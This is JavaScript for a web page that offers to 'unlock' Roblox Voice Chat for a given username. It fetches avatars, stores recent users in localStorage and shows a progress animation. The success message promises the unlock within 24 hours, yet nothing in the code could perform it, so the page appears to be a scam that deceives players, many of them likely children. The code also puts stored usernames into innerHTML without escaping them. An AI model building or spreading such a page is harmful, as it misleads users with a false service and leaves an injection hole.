// ========== RECENT ACTIVITY FUNCTIONS ==========

// Function to fetch Roblox user avatar
async function fetchUserAvatar(username) {
    try {
        // Try to fetch user ID first
        const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
        const data = await response.json();
        
        if (data && data.Id) {
            const userId = data.Id;
            // Get avatar thumbnail
            const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=100x100&format=Png`);
            const avatarData = await avatarResponse.json();
            
            if (avatarData.data && avatarData.data[0]) {
                return {
                    userId: userId,
                    avatarUrl: avatarData.data[0].imageUrl
                };
            }
        }
        
        // Fallback to default avatar
        return {
            userId: null,
            avatarUrl: 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'
        };
    } catch (error) {
        console.error('Error fetching avatar:', error);
        // Return default avatar
        return {
            userId: null,
            avatarUrl: 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'
        };
    }
}

// Save recent user to localStorage
async function saveRecentUser(username) {
    // Fetch user info
    const userInfo = await fetchUserAvatar(username);
    
    const newUser = {
        username: username,
        userId: userInfo.userId,
        avatar: userInfo.avatarUrl,
        timestamp: Date.now()
    };
    
    // Get existing recent users
    let recent = JSON.parse(localStorage.getItem("recentUsers")) || [];
    
    // Check if user already exists
    const existingIndex = recent.findIndex(user => user.username.toLowerCase() === username.toLowerCase());
    
    if (existingIndex !== -1) {
        // Remove existing entry
        recent.splice(existingIndex, 1);
    }
    
    // Add new user to the front
    recent.unshift(newUser);
    
    // Limit to 10 users
    recent = recent.slice(0, 10);
    
    // Save to localStorage
    localStorage.setItem("recentUsers", JSON.stringify(recent));
    
    // Reload the recent users display
    loadRecentUsers();
    
    return newUser;
}

// Load and display recent users
function loadRecentUsers() {
    const recentList = document.getElementById('recentList');
    const recent = JSON.parse(localStorage.getItem("recentUsers")) || [];
    
    if (recent.length === 0) {
        recentList.innerHTML = `
            <div class="recent-empty">
                <i class="fas fa-user-friends"></i>
                <p>No recent users yet</p>
                <p style="font-size: 12px; margin-top: 8px;">Enter a username above to get started</p>
            </div>
        `;
        return;
    }
    
    // Generate HTML for each recent user
    recentList.innerHTML = recent.map(user => `
        <div class="recent-card" data-username="${user.username}">
            <img src="${user.avatar}" alt="${user.username}" class="recent-avatar" onerror="this.src='https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'">
            <div class="recent-username">@${user.username}</div>
            ${user.userId ? 
                `<a href="https://www.roblox.com/users/${user.userId}/profile" target="_blank" class="recent-link" onclick="event.stopPropagation()">
                    <i class="fas fa-external-link-alt"></i> View Profile
                </a>` :
                `<span class="recent-link" style="opacity: 0.6; cursor: default;">
                    <i class="fas fa-user"></i> Profile not found
                </span>`
            }
        </div>
    `).join('');
    
    // Add click event to cards to populate username field
    document.querySelectorAll('.recent-card').forEach(card => {
        card.addEventListener('click', function() {
            const username = this.dataset.username;
            const usernameInput = document.getElementById('usernameInput');
            usernameInput.value = username;
            usernameInput.focus();
            showNotification("Username Loaded", `@${username} has been added to the username field`, "info");
        });
    });
}

// Add animation when new card appears
function animateNewCard() {
    const cards = document.querySelectorAll('.recent-card');
    if (cards.length > 0) {
        cards[0].style.animation = 'slideIn 0.4s ease';
        setTimeout(() => {
            cards[0].style.animation = '';
        }, 400);
    }
}

// ========== MODIFIED HANDLE CONFIRM FUNCTION ==========
// Replace your existing handleConfirm function with this one

async function handleConfirm() {
    const profileLink = document.getElementById('profileLinkInput').value.trim();
    const username = document.getElementById('usernameInput').value.trim();
    
    if (profileLink === "") {
        showNotification("Missing Information", "Please enter your Roblox profile link", "error");
        return;
    }
    
    if (username === "") {
        showNotification("Missing Information", "Please enter your Roblox username", "error");
        return;
    }
    
    if (!isValidProfileLink(profileLink)) {
        showNotification("Invalid Link", "Please enter a valid Roblox profile URL", "error");
        return;
    }
    
    if (!isValidUsername(username)) {
        showNotification("Invalid Username", "Use 3-20 characters (letters, numbers, underscores)", "error");
        return;
    }
    
    // Save to recent activity (NEW!)
    try {
        await saveRecentUser(username);
        animateNewCard();
        showNotification("Recent Activity Updated", `@${username} has been added to recent users`, "success");
    } catch (error) {
        console.error('Error saving recent user:', error);
    }
    
    // Add to processing queue (REAL STAT)
    addToProcessing(username);
    
    startProgress();
    resetSteps();
    modalOverlay.classList.add('active');
    
    runSteps(() => {
        completeProgress();
        // REAL STATS - Only increment when user actually processes
        todayCount++;
        todayCountElem.textContent = todayCount.toLocaleString();
        saveTodayCount(); // Save to localStorage immediately
        
        // Add to activity feed (REAL ACTIVITY)
        addRealActivity(username);
        
        showNotification("Success!", `Voice Chat will be unlocked for @${username} within 24 hours`, "success");
        
        const confirmBtn = document.getElementById('confirmBtn');
        confirmBtn.style.transform = 'scale(1.02)';
        setTimeout(() => {
            confirmBtn.style.transform = '';
        }, 200);
    });
}

// ========== INITIALIZE ON PAGE LOAD ==========
// Add this at the end of your script, after all functions are defined

// Load recent users when page loads
document.addEventListener('DOMContentLoaded', () => {
    loadRecentUsers();
});